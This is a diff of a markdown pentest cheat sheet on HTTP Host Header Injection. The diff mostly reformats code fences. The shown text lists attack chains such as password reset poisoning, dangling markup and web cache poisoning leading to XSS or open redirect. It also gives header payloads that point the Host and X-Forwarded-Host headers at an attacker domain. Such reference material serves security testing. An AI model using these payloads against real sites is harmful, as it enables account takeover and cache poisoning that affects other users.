@@ -26,45 +26,47 @@
 - HHI ----> Password Reset Poisoning
 - HHI ----> Password Reset Poisoning via dangling markup (Host: target.com:'<a href="//bing.com/?)
 - HHI ----> Web cache poisoning
-```
+    ```
     I. Web Cache Poisoning ----> XSS
     II. Web Cache Poisoning ----> Open Redirection
     III. Web Cache Poisoning ----> Open Redirection ----> Dos
-```
+    ```
+
 ### Payloads:
 - Change the host header
-```
+    ```
     Host: vulnerable-website.com ----> evil-website.com
-```
+    ```
     
 - Duplicating the host header
-```
+    ```
     GET /index.php HTTP/1.1
     Host: vulnerable-website.com 
     Host: evil-website.com
+    ```
     
 - Add host override headers
-```
+    ```
     X-Forwarded-For: evil-website.com 
     X-Forwarded-Host: evil-website.com 
     X-Client-IP: evil-website.com 
     X-Remote-IP: evil-website.com 
     X-Remote-Addr: evil-website.com 
     X-Host: evil-website.com
-```
+    ```
 
 - Add line wrapping
-```
+    ```
     GET /index.php HTTP/1.1 
     Host: vulnerable-website.com
     Host: evil-website.com
-```
+    ```
 
 - Supply an absolute URL
-```
+    ```
     GET https://vulnerable-website.com/ HTTP/1.1 
     Host: evil-website.com
-```
+    ```
 
 
 ## 4. Automation
